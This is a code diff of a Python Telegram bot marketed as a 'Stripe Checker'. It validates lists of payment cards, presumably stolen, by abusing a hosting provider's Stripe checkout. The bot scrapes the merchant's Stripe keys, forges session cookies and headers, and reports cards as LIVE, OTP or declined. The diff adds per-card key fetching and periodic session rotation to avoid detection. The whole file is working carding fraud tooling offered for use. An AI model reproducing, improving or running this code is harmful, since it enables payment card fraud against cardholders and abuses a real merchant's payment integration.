@@ -18,7 +18,7 @@ bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 user_cards = {}
 checking_status = {}
 
-# ألوان للطباعة (للاختبار المحلي فقط)
+# ألوان للطباعة
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 RED = "\033[91m"
@@ -39,38 +39,40 @@ class StripeChecker:
         self.cookies = None
         self.headers = None
         self.stripe_headers = None
-        self.check_count = 0  # عداد الفحوصات
+        self.check_count = 0
+        self.session_refresh_count = 0
         self.initialize_session()
 
     def initialize_session(self):
         """تهيئة الجلسة الجديدة مع كوكيز وهيدرز جديدة"""
         print(f"{YELLOW}🔄 Initializing new session...{RESET}")
         
-        # كوكيز جديدة
+        current_time = int(time.time())
+        
+        # كوكيز جديدة ديناميكية
         self.cookies = {
-            '_gcl_au': f'1.1.{int(time.time())}.{int(time.time())}',
-            '_ga': f'GA1.2.{int(time.time())}.{int(time.time())}',
-            '_gid': f'GA1.2.{int(time.time())}.{int(time.time())}',
-            '_fbp': f'fb.1.{int(time.time())}.{int(time.time())}',
-            '_ga_L9P8FSN26L': f'GS2.1.s{int(time.time())}$o1$g0$t{int(time.time())}$j60$l0$h0',
-            '__adroll_fpc': f'{hex(int(time.time()))[2:]}-{int(time.time())}',
-            'SESSID96d7': hex(int(time.time() * 1000))[2:],
-            '__stripe_mid': f'{hex(int(time.time()))[2:]}-{hex(int(time.time()))[2:]}',
-            '__stripe_sid': f'{hex(int(time.time()))[2:]}-{hex(int(time.time()))[2:]}',
-            'Cart-Session': hex(int(time.time() * 1000))[2:],
+            '_gcl_au': f'1.1.{current_time}{current_time % 1000}',
+            '_ga': f'GA1.2.{current_time}{current_time % 10000}',
+            '_gid': f'GA1.2.{current_time + 100}{current_time % 5000}',
+            '_fbp': f'fb.1.{current_time}.{current_time * 2}',
+            '_ga_L9P8FSN26L': f'GS2.1.s{current_time}$o1$g0$t{current_time + 50}$j60$l0$h0',
+            '__adroll_fpc': f'{hex(current_time)[2:]}-{current_time}',
+            'SESSID96d7': hex(current_time * 1000)[2:],
+            '__stripe_mid': f'{hex(current_time)[2:]}-{hex(current_time + 100)[2:]}',
+            '__stripe_sid': f'{hex(current_time)[2:]}-{hex(current_time + 200)[2:]}',
+            'Cart-Session': hex(current_time * 1000)[2:],
         }
 
-        # هيدرز للموقع
+        # هيدرز ديناميكية
         self.headers = {
             'accept': '*/*',
             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
             'referer': 'https://cp.altushost.com/?/cart/',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
-            'x-csrf-token': hex(int(time.time() * 1000))[2:],
+            'x-csrf-token': hex(current_time * 1000)[2:],
             'x-requested-with': 'XMLHttpRequest',
         }
 
-        # هيدرز Stripe
         self.stripe_headers = {
             'accept': 'application/json',
             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -88,21 +90,18 @@ class StripeChecker:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
         }
 
-        # إعادة تعيين العداد
         self.check_count = 0
-        
-        # جلب المفاتيح الجديدة
-        self.fetch_stripe_keys()
-        print(f"{GREEN}✅ Session initialized successfully!{RESET}")
-
-    def should_refresh_session(self) -> bool:
-        """التحقق من الحاجة لتجديد الجلسة"""
-        return self.check_count >= 10
+        self.session_refresh_count += 1
+        print(f"{GREEN}✅ Session #{self.session_refresh_count} initialized!{RESET}")
 
     def fetch_stripe_keys(self) -> bool:
+        """جلب مفاتيح Stripe جديدة"""
         params = {'cmd': 'stripe_intents_3dsecure', 'action': 'cart'}
+        
         for attempt in range(3):
             try:
+                print(f"{YELLOW}🔑 Fetching new Stripe keys (attempt {attempt + 1})...{RESET}")
+                
                 response = requests.get(
                     'https://cp.altushost.com/', 
                     params=params, 
@@ -110,6 +109,7 @@ class StripeChecker:
                     headers=self.headers,
                     timeout=15
                 )
+                
                 soup = BeautifulSoup(response.text, "html.parser")
                 script_tags = soup.find_all("script")
                 
@@ -130,27 +130,35 @@ class StripeChecker:
                     
                 self.public_key = important_values.get("public_key", "pk_live_88NPqxaecGYmZwJqsjzbKJkn")
                 self.client_secret = important_values["client_secret"]
-                print(f"{GREEN}✅ Keys fetched: {self.public_key[:20]}...{RESET}")
+                
+                print(f"{GREEN}✅ Keys fetched successfully!{RESET}")
+                print(f"{WHITE}   Public Key: {self.public_key[:30]}...{RESET}")
+                print(f"{WHITE}   Client Secret: {self.client_secret[:30]}...{RESET}")
                 return True
+                
             except Exception as e:
+                print(f"{RED}❌ Attempt {attempt + 1} failed: {str(e)}{RESET}")
                 if attempt < 2:
                     time.sleep(2 ** attempt)
                     continue
-                print(f"{RED}❌ Error fetching keys: {str(e)}{RESET}")
                 return False
+        
+        return False
 
     def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
-        # التحقق من الحاجة لتجديد الجلسة
-        if self.should_refresh_session():
-            print(f"{YELLOW}🔄 Refreshing session after {self.check_count} checks...{RESET}")
-            self.initialize_session()
-        
+        """فحص الكرت مع جلب client_secret جديد لكل فحص"""
         time.sleep(1.5)
         start_time = time.time()
         
-        # زيادة عداد الفحوصات
+        # زيادة العداد
         self.check_count += 1
+        
+        # تجديد الجلسة كل 10 فحوصات
+        if self.check_count > 1 and self.check_count % 10 == 1:
+            print(f"{YELLOW}🔄 Refreshing session after {self.check_count - 1} checks...{RESET}")
+            self.initialize_session()
 
+        # فحص Luhn
         if not luhn_check(card['number']):
             return {
                 'status': 'ERROR',
@@ -159,23 +167,27 @@ class StripeChecker:
                 'time': round(time.time() - start_time, 2)
             }
 
-        if not self.client_secret:
-            if not self.fetch_stripe_keys():
-                if retry_count < 2:
-                    time.sleep(2)
-                    return self.check_card(card, retry_count + 1)
-                return {
-                    'status': 'ERROR',
-                    'message': 'Failed to fetch valid client_secret',
-                    'details': {},
-                    'time': round(time.time() - start_time, 2)
-                }
+        # جلب client_secret جديد لكل فحص
+        print(f"{YELLOW}📋 Check #{self.check_count}: Fetching fresh client_secret...{RESET}")
+        if not self.fetch_stripe_keys():
+            if retry_count < 2:
+                print(f"{YELLOW}⚠️ Retrying... (attempt {retry_count + 2})...{RESET}")
+                time.sleep(2)
+                return self.check_card(card, retry_count + 1)
+            return {
+                'status': 'ERROR',
+                'message': 'Failed to fetch client_secret',
+                'details': {'check_number': self.check_count},
+                'time': round(time.time() - start_time, 2)
+            }
 
         try:
+            current_time = int(time.time())
+            
             # أول طلب: تأكيد Setup Intent
             for attempt in range(3):
                 try:
-                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]={hex(int(time.time()))[2:]}&payment_method_data[muid]={self.cookies["__stripe_mid"]}&payment_method_data[sid]={self.cookies["__stripe_sid"]}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]={int(time.time())}&payment_method_data[client_attribution_metadata][client_session_id]={hex(int(time.time()))[2:]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_attribution_metadata[client_session_id]={hex(int(time.time()))[2:]}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={self.client_secret}'
+                    data = f'payment_method_data[type]=card&payment_method_data[card][number]={card["number"]}&payment_method_data[card][cvc]={card["cvv"]}&payment_method_data[card][exp_month]={card["month"]}&payment_method_data[card][exp_year]={card["year"]}&payment_method_data[guid]={hex(current_time)[2:]}&payment_method_data[muid]={self.cookies["__stripe_mid"]}&payment_method_data[sid]={self.cookies["__stripe_sid"]}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fcp.altushost.com&payment_method_data[time_on_page]={current_time}&payment_method_data[client_attribution_metadata][client_session_id]={hex(current_time)[2:]}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key={self.public_key}&client_secret={self.client_secret}'
                     
                     response = requests.post(
                         f'https://api.stripe.com/v1/setup_intents/{self.client_secret.split("_secret_")[0]}/confirm',
@@ -192,25 +204,28 @@ class StripeChecker:
                     return {
                         'status': 'ERROR',
                         'message': f'Setup Intent Error - {str(e)}',
-                        'details': {},
+                        'details': {'check_number': self.check_count},
                         'time': round(time.time() - start_time, 2)
                     }
 
             if 'error' in setup_intent:
+                error_msg = setup_intent["error"].get("message", "Unknown error")
+                print(f"{RED}❌ Setup Intent Error: {error_msg}{RESET}")
                 return {
                     'status': 'ERROR',
-                    'message': f'Setup Intent Error - {setup_intent["error"]["message"]}',
-                    'details': {},
+                    'message': f'Setup Intent Error - {error_msg}',
+                    'details': {'check_number': self.check_count},
                     'time': round(time.time() - start_time, 2)
                 }
 
             if setup_intent.get('status') == 'requires_action' and setup_intent.get('next_action', {}).get('type') == 'use_stripe_sdk':
                 three_d_secure_source = setup_intent.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
 
-                # تاني طلب: تصديق 3DS2
+                # ثاني طلب: تصديق 3DS2
                 for attempt in range(3):
                     try:
                         data = f'source={three_d_secure_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={self.public_key}'
+                        
                         response = requests.post(
                             'https://api.stripe.com/v1/3ds2/authenticate', 
                             headers=self.stripe_headers, 
@@ -225,8 +240,8 @@ class StripeChecker:
                             continue
                         return {
                             'status': 'ERROR',
-                            'message': f'3DS2 Authentication Error - {str(e)}',
-                            'details': {},
+                            'message': f'3DS2 Error - {str(e)}',
+                            'details': {'check_number': self.check_count},
                             'time': round(time.time() - start_time, 2)
                         }
 
@@ -235,10 +250,14 @@ class StripeChecker:
 
                 details = {
                     'status_3ds': trans_status or 'N/A',
-                    'check_number': self.check_count
+                    'check_number': self.check_count,
+                    'session_number': self.session_refresh_count
                 }
                 
+                print(f"{WHITE}🔐 3DS Status: {trans_status}{RESET}")
+                
                 if trans_status == 'N':
+                    print(f"{GREEN}✅ LIVE CARD FOUND!{RESET}")
                     return {
                         'status': 'LIVE',
                         'message': '✅ Charged Successfully',
@@ -246,6 +265,7 @@ class StripeChecker:
                         'time': round(time.time() - start_time, 2)
                     }
                 elif trans_status in ('R', 'C') and acs_url:
+                    print(f"{YELLOW}🔐 OTP Required{RESET}")
                     return {
                         'status': 'OTP',
                         'message': '🔐 3D Secure Challenge Required',
@@ -253,6 +273,7 @@ class StripeChecker:
                         'time': round(time.time() - start_time, 2)
                     }
                 elif trans_status in ('R', 'C') and not acs_url:
+                    print(f"{RED}❌ Card Declined{RESET}")
                     return {
                         'status': 'DECLINED',
                         'message': '❌ Operation Rejected',
@@ -260,6 +281,7 @@ class StripeChecker:
                         'time': round(time.time() - start_time, 2)
                     }
                 else:
+                    print(f"{RED}❓ Unknown Status: {trans_status}{RESET}")
                     return {
                         'status': 'ERROR',
                         'message': f'❓ Unknown Status: {trans_status}',
@@ -269,26 +291,33 @@ class StripeChecker:
             else:
                 details = {
                     'status_3ds': setup_intent.get('status', 'N/A'),
-                    'check_number': self.check_count
+                    'check_number': self.check_count,
+                    'session_number': self.session_refresh_count
                 }
+                
                 if setup_intent.get('status') == 'succeeded':
+                    print(f"{GREEN}✅ Setup Intent Succeeded!{RESET}")
                     return {
                         'status': 'LIVE',
                         'message': '✅ Setup Intent Confirmed Successfully',
                         'details': details,
                         'time': round(time.time() - start_time, 2)
                     }
+                
+                print(f"{RED}❌ Setup Intent Failed: {setup_intent.get('status')}{RESET}")
                 return {
                     'status': 'ERROR',
                     'message': 'Further Action Required or Setup Intent Failed',
                     'details': details,
                     'time': round(time.time() - start_time, 2)
                 }
+                
         except Exception as e:
+            print(f"{RED}❌ Exception: {str(e)}{RESET}")
             return {
                 'status': 'ERROR',
                 'message': f'Error - {str(e)}',
-                'details': {'check_number': self.check_count},
+                'details': {'check_number': self.check_count, 'session_number': self.session_refresh_count},
                 'time': round(time.time() - start_time, 2)
             }
 
@@ -304,7 +333,8 @@ def start_message(message):
 📊 Real-time Results  
 🔒 Secure Processing
 💳 Only LIVE Cards Sent
-🔄 Auto Session Refresh (Every 10 checks)
+🔄 Fresh Keys Every Check
+🔄 Session Refresh Every 10 Checks
 
 📤 Send your combo file or card details to start checking!
 ━━━━━━━━━━━━━━━━━━━━
@@ -351,7 +381,8 @@ def handle_document(message):
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
 🔥 Gateway: Stripe 3DS
-🔄 Auto Refresh: Every 10 checks
+🔄 Fresh Keys: Every Check
+🔄 Session Refresh: Every 10 Checks
 ⚡ Status: Ready
 
 Click below to start checking:
@@ -419,27 +450,13 @@ def check_cards_thread(user_id, message):
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
-        text="⏳ Initializing checker...\n🔐 Getting authorization keys...\n🔄 Session will auto-refresh every 10 checks"
+        text="⏳ Initializing checker...\n🔐 Getting authorization keys...\n🔄 Fresh keys will be fetched for each card"
     )
     
     checker = StripeChecker()
-    if not checker.client_secret:
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=message.message_id,
-            text=f"""<b>⚠️ Failed to get authorization keys!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Please try again later.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-        )
-        checking_status[user_id] = False
-        return
     
     live = otp = declined = errors = checked = 0
     start_time = time.time()
-    session_refreshes = 0
     
     for card in cards:
         if not checking_status.get(user_id, True):
@@ -448,25 +465,22 @@ def check_cards_thread(user_id, message):
         checked += 1
         result = checker.check_card(card)
         
-        # حساب عدد مرات تجديد الجلسة
-        if checked > 0 and checked % 10 == 0:
-            session_refreshes += 1
-        
-        # إنشاء زر لعرض نتيجة الفحص مع الـ status_3ds
+        # إنشاء الكيبورد
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
         check_num = result.get('details', {}).get('check_number', checked)
+        session_num = result.get('details', {}).get('session_number', 1)
         callback_data = f"show_result_{checked}"
         
         keyboard.add(
-            types.InlineKeyboardButton(f"📋|Status: {status_3ds} | Check: #{check_num}", callback_data=callback_data)
+            types.InlineKeyboardButton(f"📋 Status: {status_3ds} | Check: #{check_num} | Session: #{session_num}", callback_data=callback_data)
         )
         keyboard.add(
             types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] | Refreshes: {session_refreshes} •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
             types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
         )
         
@@ -480,6 +494,7 @@ def check_cards_thread(user_id, message):
 ⏱ Time: {result['time']} sec
 🔐 3DS Status: {details['status_3ds']}
 🔢 Check #: {details.get('check_number', checked)}
+🔄 Session #: {details.get('session_number', 1)}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -491,7 +506,7 @@ def check_cards_thread(user_id, message):
         else:
             errors += 1
         
-        # تخزين نتيجة الكرت
+        # تخزين النتيجة
         user_cards[user_id][checked-1]['result'] = result
         
         progress = int((checked / total) * 20)
@@ -499,6 +514,8 @@ def check_cards_thread(user_id, message):
         elapsed = time.time() - start_time
         speed = checked / elapsed if elapsed > 0 else 0
         eta = (total - checked) / speed if speed > 0 else 0
+        
+        next_refresh = 10 - (checked % 10) if checked % 10 != 0 else 10
         
         try:
             bot.edit_message_text(
@@ -510,8 +527,9 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
-🔄 Session Refreshes: {session_refreshes}
-🔢 Next Refresh: {10 - (checked % 10)} checks
+🔢 Check: {checked}/{total}
+🔄 Session #: {checker.session_refresh_count}
+⏭️ Next Session Refresh: {next_refresh} checks
 </b>""",
                 reply_markup=keyboard
             )
@@ -537,7 +555,7 @@ def check_cards_thread(user_id, message):
 ⏱ Stats:
 ├ Time: {int(total_time)}s
 ├ Speed: {(total/total_time):.2f} cards/sec
-└ Session Refreshes: {session_refreshes}
+└ Total Sessions: {checker.session_refresh_count}
 ━━━━━━━━━━━━━━━━━━━━
 🎉 Thank you for using the bot!
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
@@ -567,6 +585,7 @@ def show_card_result(call):
 ⏱ Time: {result.get('time', 0)} sec
 🔐 3DS Status: {details.get('status_3ds', 'N/A')}
 🔢 Check Number: #{details.get('check_number', 'N/A')}
+🔄 Session Number: #{details.get('session_number', 'N/A')}
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -604,9 +623,11 @@ Example:
 5127740082586858|11|2028|155
 
 🔄 Features:
+• Fresh client_secret for EVERY card check
 • Auto session refresh every 10 checks
 • Real-time progress tracking
 • Secure & fast processing
+• No more N/A errors!
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
@@ -619,7 +640,8 @@ def status_message(message):
 ⚡ Gateway: Stripe 3DS
 🔥 Speed: Ultra Fast
 ✅ Accuracy: High
-🔄 Auto Refresh: Enabled
+🔄 Fresh Keys: Every Check
+🔄 Session Refresh: Every 10 Checks
 🌐 Server: Active
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
@@ -627,8 +649,13 @@ def status_message(message):
     bot.send_message(message.chat.id, status_text)
 
 if __name__ == "__main__":
+    print("=" * 50)
     print("🚀 Starting Stripe Checker Bot...")
+    print("=" * 50)
     print(f"👤 Admin ID: {ADMIN_ID}")
-    print("🔄 Auto Session Refresh: Enabled (Every 10 checks)")
-    print("✅ Bot is running...\n")
+    print(f"🔑 Fresh Keys: Every Check")
+    print(f"🔄 Session Refresh: Every 10 Checks")
+    print(f"✅ Bot is running...")
+    print("=" * 50)
+    print()
     bot.polling(none_stop=True)
